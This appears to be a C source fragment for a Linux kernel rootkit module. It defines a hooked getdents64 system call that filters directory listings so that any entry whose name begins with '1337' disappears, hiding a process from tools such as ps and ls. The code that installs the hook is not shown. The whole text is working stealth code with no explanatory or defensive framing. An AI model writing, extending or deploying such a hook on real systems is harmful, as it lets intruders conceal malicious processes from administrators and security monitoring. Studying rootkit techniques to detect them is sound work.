#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/module.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent =
        (struct linux_dirent64 __user *)regs->si;

    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 *dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker) return ret;

    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }

    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long offset = 0;

    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;

        // Hide process "1337".
        if (memcmp("1337", current_dir->d_name, 4) == 0) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir,
                        (void *)current_dir + current_dir->d_reclen,
                        ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return -EFAULT;
    }
    kfree(dirent_ker);
    return ret;
}
#endif